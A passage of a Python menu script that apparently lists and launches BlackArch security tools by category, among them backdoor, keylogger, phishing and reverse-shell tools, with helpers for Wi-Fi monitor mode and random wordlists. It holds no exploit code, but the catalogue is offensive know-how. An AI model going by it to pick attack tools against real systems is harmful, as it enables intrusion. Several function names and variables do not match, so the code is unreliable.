        "scap-workbench",
        "search1337",
        "shellerator",
        "shellpop",
        "shellz",
        "simple-ducky",
        "sipvicious",
        "sn00p",
        "sn1per",
        "sploitctl",
        "spookflare",
        "statsprocessor",
        "thefatrat",
        "tiger",
        "tlssled",
        "torctl",
        "ttpassgen",
        "unix-privesc-check",
        "username-anarchy",
        "valhalla-api",
        "veil",
        "vlan-hopping",
        "voiphopper",
        "wifi-autopwner",
        "wikigen",
        "wmd",
        "wnmap",
    ]

    Lister(tools)


def Binary():
    Banner()

    tools = [
        "amber",
        "amoco",
        "androguard",
        "angr",
        "angr-management",
        "angr-py2",
        "avet",
        "barf",
        "bgrep",
        "binaryninja-python",
        "bindead",
        "bindiff",
        "binflow",
        "binwally",
        "bsdiff",
        "bvi",
        "bytecode-viewer",
        "cminer",
        "cpp2il",
        "detect-it-easy",
        "dissector",
        "dutas",
        "dwarf",
        "dynamorio",
        "ecfs",
        "elfparser",
        "eresi",
        "exescan",
        "expimp-lookup",
        "expose",
        "haystack",
        "hercules-payload",
        "hex2bin",
        "imagejs",
        "jpegdump",
        "klee",
        "leena",
        "loadlibrary",
        "manticore",
        "metame",
        "objdump2shellcode",
        "oledump",
        "packerid",
        "patchkit",
        "pixd",
        "powerstager",
        "procdump",
        "proctal",
        "python-oletools",
        "python-peid",
        "python2-oletools",
        "qbdi",
        "quickscope",
        "rbasefind",
        "redress",
        "saruman",
        "sgn",
        "soot",
        "stringsifter",
        "triton",
        "veles",
        "wcc",
        "wxhexeditor",
        "zelos",
    ]

    Lister(tools)


def Anti_forensic():
    Banner()

    tools = [
        "afflib",
        "aimage",
        "air",
        "analyzemft",
        "autopsy",
        "bmap-tools",
        "bmc-tools",
        "bulk-extractor",
        "canari",
        "captipper",
        "casefile",
        "chaosmap",
        "chromefreak",
        "dc3dd",
        "dcfldd",
        "dfir-ntfs",
        "dftimewolf",
        "disitool",
        "dmde",
        "dmg2img",
        "dshell",
        "dumpzilla",
        "eindeutig",
        "emldump",
        "evtkit",
        "exiflooter",
        "extractusnjrnl",
        "firefox-decrypt",
        "fridump",
        "galleta",
        "grokevt",
        "guymager",
        "imagemounter",
        "indx2csv",
        "indxcarver",
        "indxparse",
        "interrogate",
        "iosforensic",
        "ipba2",
        "iphoneanalyzer",
        "jefferson",
        "lazagne",
        "ldsview",
        "lfle",
        "libfvde",
        "limeaide",
        "log-file-parser",
        "loki-scanner",
        "mac-robber",
        "magicrescue",
        "make-pdf",
        "malheur",
        "maltego",
        "malwaredetect",
        "mboxgrep",
        "mdbtools",
        "memdump",
        "memfetch",
        "mft2csv",
        "mftcarver",
        "mftrcrd",
        "mftref2name",
        "mimipenguin",
        "mobiusft",
        "mp3nema",
        "mxtract",
        "myrescue",
        "naft",
        "netspionage",
        "networkminer",
        "nfex",
        "ntdsxtract",
        "ntfs-file-extractor",
        "ntfs-log-tracker",
        "parse-evtx",
        "pasco",
        "pcapxray",
        "pdblaster",
        "pdf-parser",
        "pdfbook-analyzer",
        "pdfid",
        "pdfresurrect",
        "peepdf",
        "pev",
        "powermft",
        "python-acquire",
        "python-dissect.archive",
        "python-dissect.btrfs",
        "python-dissect.cim",
        "python-dissect.clfs",
        "python-dissect.cstruct",
        "python-dissect.esedb",
        "python-dissect.etl",
        "python-dissect.eventlog",
        "python-dissect.evidence",
        "python-dissect.executable",
        "python-dissect.extfs",
        "python-dissect.fat",
        "python-dissect.ffs",
        "python-dissect.fve",
        "python-dissect.hypervisor",
        "python-dissect.jffs",
        "python-dissect.ntfs",
        "python-dissect.ole",
        "python-dissect.regf",
        "python-dissect.shellitem",
        "python-dissect.sql",
        "python-dissect.squashfs",
        "python-dissect.target",
        "python-dissect.thumbcache",
        "python-dissect.util",
        "python-dissect.vmfs",
        "python-dissect.volume",
        "python-dissect.xfs",
        "python-flow.record",
        "python2-peepdf",
        "rcrdcarver",
        "recentfilecache-parser",
        "recoverdm",
        "recoverjpeg",
        "recuperabit",
        "regipy",
        "reglookup",
        "regripper",
        "regrippy",
        "rekall",
        "replayproxy",
        "rifiuti2",
        "safecopy",
        "scalpel",
        "scrounge-ntfs",
        "secure2csv",
        "shadowexplorer",
        "skypefreak",
        "swap-digger",
        "tchunt-ng",
        "tekdefense-automater",
        "thumbcacheviewer",
        "trid",
        "truehunter",
        "unblob",
        "undbx",
        "usbrip",
        "usnjrnl2csv",
        "usnparser",
        "vinetto",
        "vipermonkey",
        "volafox",
        "volatility-extra",
        "windows-prefetch-parser",
        "wmi-forensics",
        "xplico",
        "zipdump",
    ]

    Lister(tools)


def BlackArch_Backdoor():
    Banner()

    tools = [
        "aesshell",
        "azazel",
        "backcookie",
        "backdoor-factory",
        "backdoorme",
        "backdoorppt",
        "cymothoa",
        "debinject",
        "donut",
        "dr0p1t-framework",
        "dragon-backdoor",
        "eggshell",
        "enyelkm",
        "evilpdf",
        "exe2image",
        "gobd",
        "harness",
        "hotpatch",
        "icmpsh",
        "jynx2",
        "k55",
        "kimi",
        "kwetza",
        "ld-shatner",
        "linux-inject",
        "meterssh",
        "microsploit",
        "ms-sys",
        "nxcrypt",
        "phishery",
        "pwncat",
        "pyrasite",
        "revsh",
        "rrs",
        "rubilyn",
        "shellinabox",
        "shootback",
        "silenttrinity",
        "syringe",
        "trixd00r",
        "tsh",
        "tsh-sctp",
        "u3-pwn",
        "unicorn-powershell",
        "villain",
        "vlany",
        "webacoo",
        "webspa",
    ]

    Lister(tools)


def Bluetooth():
    Banner()
    tools = [
        "blue-hydra",
        "bluebugger",
        "bluediving",
        "bluefog",
        "bluelog",
        "bluepot",
        "blueprint",
        "bluescan",
        "bluesnarfer",
        "bluphish",
        "braces",
        "bss",
        "bt_audit",
        "btcrack",
        "btlejack",
        "btproxy-mitm",
        "btscanner",
        "carwhisperer",
        "ghettotooth",
        "hidattack",
        "obexstress",
        "redfang",
        "spooftooph",
        "tbear",
        "ubertooth",
    ]

    Lister(tools)


def Code_Audit():
    Banner()
    tools = [
        "bof-detector",
        "brakeman",
        "cflow",
        "checkov",
        "cpptest",
        "dependency-check",
        "detect-secrets",
        "devaudit",
        "githound",
        "graudit",
        "horusec",
        "local-php-security-checker",
        "mosca",
        "njsscan",
        "phpstan",
        "pscan",
        "rats",
        "semgrep",
        "slither",
        "snyk",
        "sonar-scanner",
        "spotbugs",
        "stoq",
        "tell-me-your-secrets",
        "trufflehog",
        "whispers",
        "wpbullet",
        "wscript",
        "yasca",
        "zarn",
    ]

    Lister(tools)


def Crypto():
    Banner()
    tools = [
        "aespipe",
        "auto-xor-decryptor",
        "bletchley",
        "c7decrypt",
        "ciphertest",
        "ciphr",
        "codetective",
        "cribdrag",
        "crypthook",
        "cryptonark",
        "dagon",
        "daredevil",
        "decodify",
        "deen",
        "demiguise",
        "dislocker",
        "factordb-pycli",
        "featherduster",
        "findmyhash",
        "foresight",
        "gcrypt",
        "gnutls2",
        "haiti",
        "hash-buster",
        "hash-extender",
        "hash-identifier",
        "hashcheck",
        "hashdb",
        "hashdeep",
        "hashfind",
        "hashid",
        "hashpump",
        "hashrat",
        "hdcp-genkey",
        "hlextend",
        "ja3",
        "jwt-key-recovery",
        "kh2hc",
        "kraken",
        "libbde",
        "luksipc",
        "morxkeyfmt",
        "nomorexor",
        "ntlmv1-multi",
        "omnihash",
        "openstego",
        "outguess",
        "pacumen",
        "padbuster",
        "padoracle",
        "padre",
        "pax-oracle",
        "pip3line",
        "poracle",
        "posttester",
        "pwd-hash",
        "pwdlyser",
        "rsactftool",
        "rsatool",
        "rshack",
        "rupture",
        "rustpad",
        "sbd",
        "sha1collisiondetection",
        "snow",
        "sslyze",
        "tls-attacker",
        "tls-map",
        "tlsenum",
        "tlsfuzzer",
        "tlshelpers",
        "tlspretense",
        "untwister",
        "x-rsa",
        "xorbruteforcer",
        "xorsearch",
        "zipexec",
        "zulucrypt",
    ]

    Lister(tools)


def Databse():
    Banner()
    tools = ["blindsql", "getsids", "metacoretex", "mysql2sqlite", "pgdbf"]

    Lister(tools)


def Tunnel():
    Banner()
    tools = [
        "chisel",
        "chownat",
        "ctunnel",
        "dns2tcp",
        "fraud-bridge",
        "icmptx",
        "ip-https-tools",
        "ligolo-ng",
        "matahari",
        "morxtunel",
        "multitun",
        "neo-regeorg",
        "ngrok",
        "oniongrok",
        "regeorg",
        "stegosip",
        "vstt",
        "xfltreat",
    ]

    Lister(tools)


def Spoof():
    Banner()
    tools = [
        "admid-pack",
        "aranea",
        "cisco-snmp-slap",
        "dns-spoof",
        "evil-ssdp",
        "fakenetbios",
        "lans",
        "lsrtunnel",
        "mailsend-go",
        "motsa-dns-spoofing",
        "multimac",
        "nbnspoof",
        "netcommander",
        "rbndr",
        "smikims-arpspoof",
        "spoofy",
        "sylkie",
        "synner",
    ]

    Lister(tools)


def Social():
    Banner()
    tools = [
        "anontwi",
        "blackeye",
        "buster",
        "cardpwn",
        "catphish",
        "chameleonmini",
        "credsniper",
        "crosslinked",
        "email2phonenumber",
        "facebash",
        "facebookosint",
        "facebrok",
        "fbi",
        "fluxion",
        "genisys",
        "gg-images",
        "gocabrito",
        "gophish",
        "hemingway",
        "hiddeneye",
        "hiddeneye-legacy",
        "holehe",
        "instagramosint",
        "linkedin2username",
        "linkedint",
        "maigret",
        "muraena",
        "nexfil",
        "osi.ig",
        "pepe",
        "phemail",
        "phishingkithunter",
        "phoneinfoga",
        "phonia",
        "qrljacker",
        "raven",
        "reelphish",
        "seeker",
        "sees",
        "set",
        "sherlock",
        "simpleemailspoofer",
        "skiptracer",
        "slackpirate",
        "social-analyzer",
        "social-mapper",
        "social-vuln-scanner",
        "socialfish",
        "socialpwned",
        "spf",
        "token-hunter",
        "trape",
        "tweets-analyzer",
        "twint",
        "ultimate-facebook-scraper",
        "userrecon-py",
        "weeman",
        "whatbreach",
        "whatsmyname",
    ]

    Lister(tools)


def Sniffer():
    Banner()
    tools = [
        "bittwist",
        "capfuzz",
        "cdpsnarf",
        "cottontail",
        "creds",
        "dnswatch",
        "eigrp-tools",
        "espionage",
        "firstorder",
        "hexinject",
        "httpry",
        "httpsniff",
        "hubbit-sniffer",
        "hungry-interceptor",
        "issniff",
        "junkie",
        "katsnoop",
        "mfsniffer",
        "mitmer",
        "mots",
        "net-creds",
        "nsntrace",
        "ofp-sniffer",
        "ostinato",
        "passivedns",
        "pcapteller",
        "pth-toolkit",
        "pyrdp",
        "pytacle",
        "rvi-capture",
        "sipffer",
        "snapception",
        "ssl-phuck3r",
        "ssldump",
        "sslsniff",
        "stenographer",
        "tcpick",
        "wifi-monitor",
        "xcavator",
    ]

    Lister(tools)


def Reversing():
    Banner()
    tools = [
        "android-apktool",
        "apkstudio",
        "binaryninja",
        "ctypes-sh",
        "elidecode",
        "flasm",
        "frida-extract",
        "gostringsr2",
        "hopper",
        "ida-free",
        "innounp",
        "javasnoop",
        "jeb-android",
        "jeb-arm",
        "jeb-intel",
        "jeb-mips",
        "jeb-webasm",
        "jwscan",
        "libc-database",
        "malwasm",
        "mikrotik-npk",
        "netzob",
        "pintool",
        "pintool2",
        "pyinstxtractor",
        "python-frida",
        "python2-frida",
        "radare2-keystone",
        "swfintruder",
        "swftools",
        "syms2elf",
        "udis86",
    ]

    Lister(tools)


def Recon():
    Banner()
    tools = [
        "activedirectoryenum",
        "ad-ldap-enum",
        "ad-miner",
        "adexplorersnapshot",
        "adidnsdump",
        "aiodnsbrute",
        "altdns",
        "aquatone",
        "asn",
        "attacksurfacemapper",
        "autosint",
        "aws-inventory",
        "aztarna",
        "badkarma",
        "basedomainname",
        "bfac",
        "billcipher",
        "bing-ip2hosts",
        "bloodhound",
        "bloodhound-ce-python",
        "bloodhound-python",
        "bridgekeeper",
        "catnthecanary",
        "ccrawldns",
        "certgraph",
        "chaos-client",
        "citadel",
        "cloud-buster",
        "cloudfail",
        "cloudlist",
        "cloudmare",
        "cloudunflare",
        "cr3dov3r",
        "cutycapt",
        "datasploit",
        "dga-detection",
        "dns-parallel-prober",
        "dnsbrute",
        "dnscobra",
        "dnsenum",
        "dnsgrep",
        "dnsprobe",
        "dnsrecon",
        "dnssearch",
        "dnsspider",
        "dnstracer",
        "dnswalk",
        "dnsx",
        "domain-analyzer",
        "domain-stats",
        "domained",
        "domainhunter",
        "dradis-ce",
        "elevate",
        "enum4linux",
        "enum4linux-ng",
        "enumerate-iam",
        "enumerid",
        "exitmap",
        "facebot",
        "fav-up",
        "favfreak",
        "fbid",
        "fierce",
        "finalrecon",
        "flashlight",
        "forager",
        "gasmask",
        "gatecrasher",
        "geoedge",
        "gh-dork",
        "ghunt",
        "git-hound",
        "git-wild-hunt",
        "gitdorker",
        "gitem",
        "gitgraber",
        "githack",
        "github-dorks",
        "gitmails",
        "gitminer",
        "gitrecon",
        "go-windapsearch",
        "goddi",
        "goodork",
        "goofile",
        "goog-mail",
        "googlesub",
        "goohak",
        "goop",
        "gosint",
        "grabing",
        "graphinder",
        "gwtenum",
        "h8mail",
        "hakrevdns",
        "halcyon",
        "hasere",
        "hatcloud",
        "hoper",
        "hosthunter",
        "howmanypeoplearearound",
        "id-entify",
        "idswakeup",
        "infoga",
        "inquisitor",
        "intelplot",
        "intrace",
        "ip-tracer",
        "ip2clue",
        "iptodomain",
        "ipv666",
        "ircsnapshot",
        "isr-form",
        "ivre",
        "ivre-docs",
        "ivre-web",
        "jackdaw",
        "jsearch",
        "kacak",
        "kamerka",
        "keye",
        "lanmap2",
        "lbd",
        "ldapenum",
        "ldeep",
        "legion",
        "lft",
        "lhf",
        "linux-exploit-suggester",
        "linux-exploit-suggester.sh",
        "littlebrother",
        "loot",
        "lrod",
        "machinae",
        "mail-crawl",
        "massbleed",
        "mdns-recon",
        "metabigor",
        "metafinder",
        "metagoofil",
        "mildew",
        "missidentify",
        "monocle",
        "nasnum",
        "necromant",
        "neglected",
        "netdiscover",
        "netkit-bsd-finger",
        "netkit-rusers",
        "netkit-rwho",
        "netmask",
        "netscout",
        "nohidy",
        "nsec3walker",
        "ntp-ip-enum",
        "nullinux",
        "omnibus",
        "onioff",
        "osint-spy",
        "osinterator",
        "osintgram",
        "osrframework",
        "parsero",
        "pastemonitor",
        "pdfgrab",
        "pmapper",
        "postenum",
        "protosint",
        "punter",
        "puredns",
        "pwned",
        "pwned-search",
        "pwnedornot",
        "pymeta",
        "python-api-dnsdumpster",
        "python-ivre",
        "python2-api-dnsdumpster",
        "python2-ivre",
        "python2-shodan",
        "quickrecon",
        "raccoon",
        "rdwarecon",
        "recon-ng",
        "reconnoitre",
        "reconscan",
        "recsech",
        "red-hawk",
        "reverseip",
        "revipd",
        "ridrelay",
        "ripdc",
        "rita",
        "rusthound",
        "s3enum",
        "scavenger",
        "sctpscan",
        "scylla",
        "seekr",
        "server-status-pwn",
        "shard",
        "shhgit",
        "shodanhat",
        "shosubgo",
        "simplyemail",
        "sipi",
        "smbcrunch",
        "smtp-user-enum",
        "snscrape",
        "socialscan",
        "spfmap",
        "spiderfoot",
        "spoofcheck",
        "spyse",
        "ssl-hostname-resolver",
        "stardox",
        "subdomainer",
        "subfinder",
        "sublert",
        "sublist3r",
        "subscraper",
        "svn-extractor",
        "swamp",
        "syborg",
        "teamsuserenum",
        "thedorkbox",
        "theharvester",
        "tilt",
        "tinfoleak",
        "tinfoleak2",
        "treasure",
        "trusttrees",
        "twofi",
        "ubiquiti-probing",
        "udork",
        "uhoh365",
        "uncover",
        "userrecon",
        "vbrute",
        "vpnpivot",
        "waldo",
        "waybackurls",
        "waymore",
        "websearch",
        "weebdns",
        "whatweb",
        "whoxyrm",
        "windapsearch",
        "windows-exploit-suggester",
        "xray",
        "zeus-scanner",
        "zgrab",
    ]

    Lister(tools)


def Radio():
    Banner()
    tools = [
        "airspyhf",
        "csdr",
        "cubicsdr",
        "gpredict",
        "gps-sdr-sim",
        "gqrx-scanner",
        "gr-air-modes",
        "gr-dect2",
        "gr-gsm",
        "gr-paint",
        "gsmevil2",
        "hacktv",
        "libosmocore",
        "lte-cell-scanner",
        "openwebrx",
        "proxmark",
        "qradiolink",
        "rfcat",
        "rtl",
        "rtl-wmbus",
        "rtlamr",
        "sdrpp",
        "sdrsharp",
        "sdrtrunk",
        "simtrace2",
        "spektrum",
        "wmbusmeters",
        "yate-bts",
    ]

    Lister(tools)


def Packer():
    Banner()
    tools = ["sherlocked", "vbsmin"]

    Lister(tools)


def NFC():
    Banner()
    tools = ["nfcutils"]

    Lister(toools)


def Misc():
    Banner()
    tools = [
        "archivebox",
        "arybo",
        "aspisec",
        "aurebeshjs",
        "avml",
        "base64dump",
        "bettercap-ui",
        "bqm",
        "catana",
        "centry",
        "checkiban",
        "cisco-router-config",
        "cloakify",
        "cracken",
        "credmap",
        "ctf-party",
        "cve-api",
        "dbd",
        "densityscout",
        "depix",
        "der-ascii",
        "dhcdrop",
        "dnsgen",
        "domlink",
        "dsd",
        "dsd-fme",
        "dumpsmbshare",
        "duplicut",
        "elettra",
        "elettra-gui",
        "ent",
        "evilgrade",
        "exrex",
        "extracthosts",
        "eyeballer",
        "fakemail",
        "ffuf-scripts",
        "find3",
        "firefox-security-toolkit",
        "flare",
        "genlist",
        "geoipgen",
        "gf",
        "gibberish-detector",
        "githubcloner",
        "gmsadumper",
        "goshs",
        "graffiti",
        "gtfo",
        "gtfoblookup",
        "h2spec",
        "halcyon-ide",
        "http-put",
        "httpscreenshot",
        "hurl-encoder",
        "hxd",
        "imagegrep",
        "imhex",
        "intelmq",
        "intensio-obfuscator",
        "inundator",
        "ipcountry",
        "ipobfuscator",
        "jsfuck",
        "laudanum",
        "leo",
        "magictree",
        "mapcidr",
        "metaforge",
        "mibble",
        "minimodem",
        "mkyara",
        "mrtparse",
        "msfdb",
        "narthex",
        "nmap-parse-output",
        "nsearch",
        "one-lin3r",
        "openrisk",
        "osert",
        "pass-station",
        "passdetective",
        "payloadsallthethings",
        "pdfwalker",
        "pencode",
        "plumber.py",
        "plutil",
        "princeprocessor",
        "pspy",
        "pulledpork",
        "pwdlogy",
        "pwfuzz-rs",
        "pwnedpasswords",
        "pydictor",
        "pyinstaller",
        "pyinstaller-hooks-contrib",
        "python-google-streetview",
        "python2-darts.util.lru",
        "python2-exrex",
        "python2-google-streetview",
        "python2-utidylib",
        "qrgen",
        "qsreplace",
        "rawsec-cli",
        "rbkb",
        "redeye",
        "redpoint",
        "reptor",
        "rogue-mysql-server",
        "rtfm",
        "rulesfinder",
        "sasm",
        "schnappi-dhcp",
        "sh00t",
        "shadowfinder",
        "shelling",
        "sleuthql",
        "sslcat",
        "stompy",
        "suricata-verify",
        "tcpxtract",
        "tempomail",
        "tnscmd",
        "token-reverser",
        "tpcat",
        "uatester",
        "uberfile",
        "unfurl",
        "unisec",
        "urlview",
        "usernamer",
        "verinice",
        "vfeed",
        "visualize-logs",
        "web2ldap",
        "whapa",
        "whatportis",
        "winexe",
        "winregfs",
        "wol-e",
        "wordlistctl",
        "wordlister",
        "yay",
    ]

    Lister(tools)


def Malware():
    Banner()
    tools = [
        "balbuzard",
        "bamf-framework",
        "bdlogparser",
        "box-js",
        "clamscanlogparser",
        "cuckoo",
        "damm",
        "fakenet-ng",
        "fileintel",
        "flare-floss",
        "fprotlogparser",
        "gcat",
        "malboxes",
        "malscan",
        "maltrieve",
        "malware-check-tool",
        "noriben",
        "origami",
        "peframe",
        "pepper",
        "pftriage",
        "polyswarm",
        "pyew",
        "python-mmbot",
        "sea",
        "ssma",
        "thezoo",
        "vba2graph",
        "virustotal",
        "vmcloak",
        "vt-cli",
        "zerowine",
    ]

    Lister(tools)


def Keylogger():
    Banner()
    tools = ["logkeys", "python-keylogger", "xspy"]

    Lister(tools)


def IDS():
    Banner()
    tools = ["sagan"]

    Lister(tools)


def Honeypot():
    Banner()
    tools = [
        "beeswarm",
        "conpot",
        "fakeap",
        "fiked",
        "heartbleed-honeypot",
        "honeyd",
        "honeypy",
        "honssh",
        "hpfeeds",
        "kippo",
        "pshitt",
        "python2-hpfeeds",
        "snare",
        "ssh-honeypot",
        "wifi-honey",
        "wordpot",
    ]
    Lister(tools)


def Hardware():
    Banner()
    tools = ["chipsec", "dex2jar", "hdmi-sniff", "kautilya", "pcileech"]

    Lister(tools)


def Fuzzer():
    Banner()
    tools = [
        "ajpfuzzer",
        "backfuzz",
        "bfuzz",
        "boofuzz",
        "browser-fuzzer",
        "bunny",
        "choronzon",
        "cirt-fuzzer",
        "conscan",
        "cookie-cadger",
        "crlf-injector",
        "dharma",
        "dizzy",
        "domato",
        "doona",
        "easyfuzzer",
        "firewalk",
        "flyr",
        "frisbeelite",
        "ftester",
        "ftp-fuzz",
        "fuddly",
        "fusil",
        "fuzzball2",
        "fuzzdb",
        "fuzzdiff",
        "fuzzowski",
        "goofuzz",
        "grammarinator",
        "grr",
        "hexorbase",
        "hodor",
        "honggfuzz",
        "http-fuzz",
        "ifuzz",
        "ikeprober",
        "jbrofuzz",
        "kitty-framework",
        "malybuzz",
        "manul",
        "melkor",
        "notspikefile",
        "oat",
        "ohrwurm",
        "oscanner",
        "peach",
        "peach-fuzz",
        "pentbox",
        "portmanteau",
        "powerfuzzer",
        "profuzz",
        "pulsar",
        "pyjfuzz",
        "ratproxy",
        "s3-fuzzer",
        "samesame",
        "sandsifter",
        "sfuzz",
        "sharpfuzz",
        "sloth-fuzzer",
        "smtp-fuzz",
        "snmp-fuzzer",
        "socketfuzz",
        "spiderpig-pdffuzzer",
        "spike-fuzzer",
        "sploitego",
        "sqlbrute",
        "sshfuzz",
        "sulley",
        "taof",
        "tcpcontrol-fuzzer",
        "termineter",
        "tftp-fuzz",
        "thefuzz",
        "trinity",
        "unifuzzer",
        "uniofuzz",
        "uniscan",
        "w3af",
        "webscarab",
        "webshag",
        "wfuzz",
        "wsfuzzer",
    ]

    Lister(tools)


def Firmware():
    Banner()
    tools = [
        "firmwalker",
        "firmware-mod-kit",
        "meanalyzer",
        "qflipper",
        "uefi-firmware-parser",
    ]

    Lister(tools)


def Fingerprint():
    Banner()
    tools = [
        "asp-audit",
        "blindelephant",
        "cms-explorer",
        "complemento",
        "detectem",
        "dhcpf",
        "dnsmap",
        "fl0p",
        "fpdns",
        "ftpmap",
        "htrosbif",
        "httprint",
        "lbmap",
        "mwebfp",
        "neighbor-cache-fingerprinter",
        "nimbostratus",
        "ntp-fingerprint",
        "operative",
        "propecia",
        "scannerl",
        "sinfp",
        "smtpmap",
        "smtpscan",
        "spartan",
        "thcrut",
        "tls-fingerprinting",
        "tls-prober",
        "xprobe2",
        "zgrab2",
    ]

    Lister(tools)


def Drone():
    Banner()
    tools = ["crozono", "missionplanner", "skyjack", "snoopy-ng"]

    Lister(tools)


def Defensive():
    Banner()
    tools = [
        "arpon",
        "arpstraw",
        "artillery",
        "artlas",
        "capa",
        "chainsaw",
        "chkrootkit",
        "detect-sniffer",
        "fastnetmon",
        "fssb",
        "honeycreds",
        "ifchk",
        "inetsim",
        "jeopardize",
        "lorg",
        "malice",
        "malmon",
        "maltrail",
        "mat",
        "munin-hashchecker",
        "nipe",
        "orjail",
        "osfooler-ng",
        "persistencesniper",
        "portspoof",
        "prowler",
        "quicksand-lite",
        "sentrypeer",
        "sigma",
        "sniffjoke",
        "snort",
        "sooty",
        "suricata",
        "tabi",
        "tfsec",
        "threatspec",
        "tor-autocircuit",
        "tor-browser",
        "tor-router",
        "tyton",
        "usb-canary",
        "yeti",
        "zeus",
    ]

    Lister(tools)


def Decompiler():
    Banner()
    tools = [
        "avaloniailspy",
        "beebug",
        "cafebabe",
        "fernflower",
        "gadgetinspector",
        "jbe",
        "jd-cli",
        "jd-gui",
        "jpexs-decompiler",
        "luyten",
        "pcode2code",
        "procyon",
        "python-uncompyle6",
        "recaf",
        "recstudio",
        "rej",
        "retdec",
    ]

    Lister(tools)


def Debugger():
    Banner()
    tools = [
        "edb",
        "electric-fence",
        "gdbgui",
        "heaptrace",
        "ollydbg",
        "rr",
        "saleae-logic",
        "shellnoob",
        "vivisect",
        "voltron",
    ]

    Lister(tools)


def dis_monitor():
    Banner()
    interfaces = get_if_list()

    print("Select interface:")
    for i, interface in enumerate(interfaces):
        print(f"{i + 1}. {interface}")

    selected = int(input("FG_Teams: "))
    selected_interface = interfaces[selected - 1]
    subprocess.run(
        ["ip", "link", "set", selected_interface, "down"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["airmon-ng", "check", "kill"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["iwconfig", selected_interface, "mode", "managed"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["systemctl", "start", "NetworkManager"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    print(f"{selected_interface} is now back to normal")


def en_monitor():
    Banner()
    interfaces = get_if_list()

    print("Select interface:")
    for i, interface in enumerate(interfaces):
        print(f"{i + 1}. {interface}")

    selected = int(input("FG_Teams: "))
    selected_interface = interfaces[selected - 1]

    subprocess.run(
        ["airmon-ng", "check", "kill"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["iwconfig", selected_interface, "mode", "monitor"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        ["ip", "link", "set", selected_interface, "up"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    print(f"{selected_interface} is now in monitor mode.")


def showIp_and_public():
    Banner()
    ip = socket.gethostbyname(socket.gethostname())
    print("Your IP address is:", ip)

    response = requests.get("https://api.ipify.org")
    public_ip = response.text
    print("Your public IP address is:", public_ip)


def show_mac_addr():
    Banner()
    mac = get_mac_address()
    print("Your MAC address is:", mac)


def wordlist():
    Banner()
    characters = string.ascii_letters + string.digits + string.punctuation
    password_queue = queue.Queue()

    def generate_passwords():
        while True:
            password = "".join(random.choices(characters, k=int(password_length)))
            password_queue.put(password)

    password_length = input("Enter the desired password length: ")

    total_possible_passwords = len(characters) ** int(password_length)

    animation_frame = 0
    animation_frames = ["|", "/", "-", "\\"]

    for _ in range(os.cpu_count()):
        t = threading.Thread(target=generate_passwords)
        t.daemon = True
        t.start()

    generated_passwords = set()

    while True:
        password = password_queue.get()
        if password in generated_passwords:
            continue
        else:
            generated_passwords.add(password)
            with open("generated_wordlist.txt", "a") as f:
                f.write(password + "\n")

        os.system("cls" if os.name == "nt" else "clear")
        print(
            f"{len(generated_passwords)}/{total_possible_passwords} passwords generated {animation_frames[animation_frame % len(animation_frames)]}"
        )
        animation_frame += 1

        time.sleep(0.1)

        if len(generated_passwords) == total_possible_passwords:
            break


def general():
    Banner()
    print("\n1. Enable monitor mode")
    print("\n2. Disable monitor mode")
    print("\n3. Ip adress and public IP.")
    print("\n4. your mac adress")
    print("\n5. Enable ghostnet")
    print("\n6. Disable ghostnet")
    print("\n7. Ifconfig")
    print("\n8. generate wordlist")

    ge = input("FG_Teams: ")

    if ge == "1":
        en_monitor()
    elif ge == "2":
        dis_monitor()
    elif ge == "3":
        showIp_and_public()
    elif ge == "4":
        show_mac_addr()
    elif ge == "5":
        os.system("ghostnet start")
    elif ge == "6":
        os.system("ghostnet stop")
    elif ge == "7":
        os.system("ifconfig")
    elif ge == "8":
        wordlist()
    else:
        main()


def Others(): ...


def Sixth_menu():
    Banner()
    print(sixth_menu)

    selected = input("\n\nSelect your option: ")

    if selected == "56":
        Voip()
    elif selected == "57":
        BlackArch_windows()
    elif selected == "58":
        Wireless()
    elif selected == "55":
        Fifth_menu()
    elif selected == "0":
        sys.exit()


def Fifth_menu():
    Banner()
    print(fifth_menu)

    selected = input("\n\nSelect your option: ")

    if selected == "45":
        Packer()
    elif selected == "46":
        Proxy()
    elif selected == "47":
        Radio()
    elif selected == "48":
        Recon()
    elif selected == "49":
        Reversing()
    elif selected == "50":
        Scanner()
    elif selected == "51":
        Sniffer()
    elif selected == "52":
        Social()
    elif selected == "53":
        Spoof()
    elif selected == "54":
        Tunnel()
    elif selected == "55":
        Fourth_menu()
    elif selected == "100":
        Sixth_menu()


def Fourth_menu():
    Banner()
    print(fourth_menu)

    selected = input("\n\nSelect your option: ")

    if selected == "34":
        Fuzzer()
    elif selected == "35":
        Hardware()
    elif selected == "36":
        Honeypot()
    elif selected == "37":
        IDS()
    elif selected == "38":
        Keylogger()
    elif selected == "39":
        Malware()
    elif selected == "40":
        Misc()
    elif selected == "41":
        Mobile()
    elif selected == "42":
        Networking()
    elif selected == "43":
        NFC()
    elif selected == "44":
        Third_menu()
    elif selected == "100":
        Fifth_menu()


def Third_menu():
    Banner()
    print(third_menu)

    selected = input("\n\nSelect your option: ")

    if selected == "23":
        Debugger()
    elif selected == "24":
        Decompiler()
    elif selected == "25":
        Defensive()
    elif selected == "26":
        Disassembler()
    elif selected == "27":
        Dos()
    elif selected == "28":
        Drone()
    elif selected == "29":
        Exploitation()
    elif selected == "30":
        Fingerprint()
    elif selected == "31":
        Firmware()
    elif selected == "32":
        Forensic()
    elif selected == "33":
        More()
    elif selected == "100":
        Fourth_menu()


def More():
    Banner()
    print(next_menu)

    selected = input("\n\nSelect your option: ")

    if selected == "12":
        WebApp()
    elif selected == "13":
        Anti_Forensic()
    elif selected == "14":
        Automation()
    elif selected == "15":
        BlackArch_Backdoor()
    elif selected == "16":
        Binary()
    elif selected == "17":
        Bluetooth()
    elif selected == "18":
        Code_Audit()
    elif selected == "19":
        Cracker()
    elif selected == "20":
        Crypto()
    elif selected == "21":
        Database()
    elif selected == "22":
        main()
    elif selected == "100":
        Third_menu()


# <---main--->
def main():
    Banner()

    print(menu)

    me = input("\n\nSelect your option: ")

    if me == "1":
        Android()
    elif me == "2":
        bruteforce()
    elif me == "3":
